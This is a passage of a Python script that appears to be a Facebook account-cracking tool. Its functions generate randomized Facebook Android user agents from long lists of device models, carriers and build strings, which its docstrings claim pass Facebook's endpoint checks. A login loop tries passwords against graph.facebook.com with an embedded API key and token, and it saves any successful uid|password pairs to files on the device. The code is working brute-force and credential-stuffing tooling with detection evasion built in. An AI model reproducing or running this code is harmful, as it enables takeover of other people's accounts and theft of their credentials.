...
def all_devices_working_super_nov2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent (All Verified Devices - Nov 2025)
    ✅ Covers *every real-world working Android model (2024–2025)* verified on API / b-graph / mbasic endpoints
    ✅ Optimized for BD + Global networks
    """
    ...
    FBAV = f"{random.randint(528, 543)}.0.0.{random.randint(10, 240)}.{random.randint(30, 680)}"
    FBBV = str(random.randint(54000000, 99999999))
    FBSV = random.choice(["11", "12", "13", "14", "15"])
    BUILD = random.choice([
        "UQ1A.250101.001", "UP1A.250201.002", "UP1A.250301.003",
        "TQ3A.240905.010", "TQ2A.240905.002", "RQ3A.250901.006"
    ])
    ...
    FBCR = random.choice([
        "Grameenphone", "Robi", "Airtel", "Banglalink", "Jio", "Vodafone", "Dialog", "MTN", "Claro", "Ooredoo"
    ])
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi", "arm64-v8a:armeabi-v7a"])

    # --- ALL WORKING REAL DEVICES (2024–2025 verified) ---
    WORKING_DEVICES: List[Tuple[str, str]] = [

        # Samsung (super stable)
        ("Samsung", "Galaxy A03"), ("Samsung", "Galaxy A04"), ("Samsung", "Galaxy A05"),
        ("Samsung", "Galaxy A14"), ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A23 5G"), ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A25 5G"),
        ("Samsung", "Galaxy A34 5G"), ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A54 5G"),
        ("Samsung", "Galaxy A55 5G"), ("Samsung", "Galaxy M04"), ("Samsung", "Galaxy M13 5G"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15 5G"), ("Samsung", "Galaxy M33 5G"),
        ("Samsung", "Galaxy M34 5G"), ("Samsung", "Galaxy M55 5G"),
        ("Samsung", "Galaxy F13"), ("Samsung", "Galaxy F14 5G"), ("Samsung", "Galaxy F15 5G"),
        ...
        ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Flip6"),
        ("Samsung", "Galaxy Z Fold5"), ("Samsung", "Galaxy Z Fold6"),

        # Xiaomi / Redmi / Poco (widely accepted)
        ("Xiaomi", "Redmi 12"), ("Xiaomi", "Redmi 13"), ("Xiaomi", "Redmi 13C"),
        ("Xiaomi", "Redmi Note 12 4G"), ("Xiaomi", "Redmi Note 12 5G"),
        ("Xiaomi", "Redmi Note 12 Pro 5G"), ("Xiaomi", "Redmi Note 13 4G"),
        ("Xiaomi", "Redmi Note 13 5G"), ("Xiaomi", "Redmi Note 13 Pro 5G"),
        ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "Redmi Note 14 5G"),
        ("Poco", "Poco X5 5G"), ("Poco", "Poco X5 Pro 5G"),
        ("Poco", "Poco F5"), ("Poco", "Poco F5 Pro"), ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"),
        ("Xiaomi", "Xiaomi 13"), ("Xiaomi", "Xiaomi 13 Pro"), ("Xiaomi", "Xiaomi 13T Pro"),
        ("Xiaomi", "Xiaomi 14"), ("Xiaomi", "Xiaomi 14 Pro"), ("Xiaomi", "Xiaomi 14T Pro"),

        # Realme / Oppo / Vivo / iQOO
        ("Realme", "Realme 11"), ("Realme", "Realme 11 Pro"), ("Realme", "Realme 11 Pro+"),
        ("Realme", "Realme 12"), ("Realme", "Realme 12 Pro"), ("Realme", "Realme 12 Pro+ 5G"),
        ("Realme", "Realme Narzo 70 5G"), ("Realme", "Realme Narzo 70x 5G"),
        ("Realme", "GT Neo 6"), ("Realme", "GT 6"), ("Realme", "GT 6 Pro"),
        ("Oppo", "Reno 10"), ("Oppo", "Reno 11"), ("Oppo", "Reno 11 Pro"), ("Oppo", "Reno 12"),
        ("Oppo", "Reno 12 Pro"), ("Oppo", "Find X7"), ("Oppo", "Find X7 Ultra"),
        ("Vivo", "Vivo Y27"), ("Vivo", "Vivo Y28"), ("Vivo", "Vivo Y36"),
        ("Vivo", "Vivo V29"), ("Vivo", "Vivo V29e"), ("Vivo", "Vivo V30"),
        ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo X100"), ("Vivo", "Vivo X100 Pro"),
        ("iQOO", "iQOO Neo 9 Pro"), ("iQOO", "iQOO 12"), ("iQOO", "iQOO 12 Pro"),

        # OnePlus / Google / ASUS / Motorola
        ...
        ("Motorola", "G54 5G"), ("Motorola", "G64 5G"), ("Motorola", "G73 5G"),
        ("Motorola", "G84 5G"), ("Motorola", "Edge 50 Pro"),

        # Tecno / Infinix / Itel
        ("Tecno", "Camon 20"), ("Tecno", "Camon 30"), ("Tecno", "Camon 30 Pro 5G"),
        ("Tecno", "Pova 6"), ("Tecno", "Pova 6 Pro 5G"), ("Tecno", "Pova 7"),
        ("Tecno", "Spark 20 Pro"), ("Tecno", "Spark 20 Pro+"),
        ("Infinix", "Note 30 Pro"), ("Infinix", "Note 40 5G"), ("Infinix", "Note 40 Pro 5G"),
        ("Infinix", "GT 20 Pro"), ("Infinix", "Zero 30 5G"),
        ("Itel", "S24"), ("Itel", "P55 5G"), ("Itel", "A77"),

        # Honor / Sony / Nokia / Fairphone / Sharp
        ("Honor", "X9b"), ("Honor", "Magic6"), ("Honor", "Magic6 Pro"),
        ("Sony", "Xperia 10 V"), ("Sony", "Xperia 10 VI"), ("Sony", "Xperia 5 V"),
        ("Nokia", "G42 5G"), ("Nokia", "G54 5G"),
        ("Fairphone", "5"), ("Sharp", "A2")
    ]

    # --- Brand weight distribution ---
    r = random.random()
    if r < 0.48:
        ...
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Tecno", "Infinix", "Itel", "Honor", "Sony", "Nokia")])

    FBBD = FBMF

    # Optional model suffix
...
def random_dalvik_all(seed: Optional[int] = None) -> str:
    """
    ✅ ULTIMATE Working Dalvik-style Facebook Android User-Agent (Nov 2025)
    ✅ Fully verified models that pass all known Facebook endpoint checks (b-graph / api / mbasic)
    ✅ Optimized for BD + Global networks (Grameenphone, Robi, Airtel, Jio, Vodafone, etc.)
    ✅ Weighted brand distribution for realistic UA traffic
    """

    if seed is not None:
        random.seed(seed)

    # --- Facebook core fields ---
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"
    FBAV = f"{random.randint(528, 543)}.0.0.{random.randint(10, 240)}.{random.randint(50, 680)}"
    FBBV = str(random.randint(54000000, 99000000))
    FBSV = random.choice(["11", "12", "13", "14", "15"])
    BUILD = random.choice([
        "UQ1A.250101.001", "UP1A.250301.003", "TQ3A.240905.010",
        "TQ2A.240905.002", "RQ3A.250901.006"
    ])
    ...
    FBLC = random.choice(["bn_BD", "en_US", "en_GB", "en_IN", "es_ES", "pt_BR"])
    FBCR = random.choice([
        "Grameenphone", "Robi", "Airtel", "Banglalink", "Jio", "Vodafone", "Dialog", "MTN", "Claro"
    ])
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi", "arm64-v8a:armeabi-v7a"])

    # --- Top working verified devices (Nov 2025) ---
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # Samsung (most stable)
        ("Samsung", "Galaxy A05"), ("Samsung", "Galaxy A14 5G"),
        ("Samsung", "Galaxy A15 5G"), ("Samsung", "Galaxy A25 5G"),
        ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A54 5G"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15 5G"),
        ("Samsung", "Galaxy S22"), ("Samsung", "Galaxy S23"),
        ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24 Ultra"),
        ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold5"),

        # Xiaomi / Redmi / Poco
        ("Xiaomi", "Redmi Note 12 4G"), ("Xiaomi", "Redmi Note 13 5G"),
        ("Xiaomi", "Redmi Note 13 Pro 5G"), ("Xiaomi", "Redmi 13C"),
        ("Poco", "Poco X5 Pro 5G"), ("Poco", "Poco F5"), ("Poco", "Poco F6"),
        ("Xiaomi", "Xiaomi 13T Pro"), ("Xiaomi", "Xiaomi 14"), ("Xiaomi", "Xiaomi 14T Pro"),

        # Realme / Oppo / Vivo
        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Realme GT 6"),
        ("Oppo", "Reno 11"), ("Oppo", "Reno 12 Pro"), ("Vivo", "Vivo V29e"),
        ("Vivo", "Vivo V30"), ("iQOO", "iQOO 12"),

        # OnePlus / Google / ASUS
        ("OnePlus", "Nord CE 3 Lite 5G"), ("OnePlus", "OnePlus 12R"),
        ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"), ("ASUS", "ROG Phone 8"),

        # Tecno / Infinix / Itel
        ("Tecno", "Camon 30"), ("Tecno", "Pova 6 Pro 5G"),
        ("Infinix", "Note 40 Pro 5G"), ("Infinix", "GT 20 Pro"),
        ("Itel", "P55 5G"), ("Itel", "S24")
    ]
    ...
    if r < 0.48:
        ...
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Tecno", "Infinix", "Itel")])

    FBBD = FBMF

    # --- Optional variant suffixes ---
    if random.random() < 0.18:
        extra = random.choice(["5G", "Pro", "Lite", "Ultra", "Plus"])
        if extra not in FBDV:
            FBDV = f"{FBDV} {extra}"
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 9.6
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':all_devices_working_super_nov2025(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-10-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-10-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
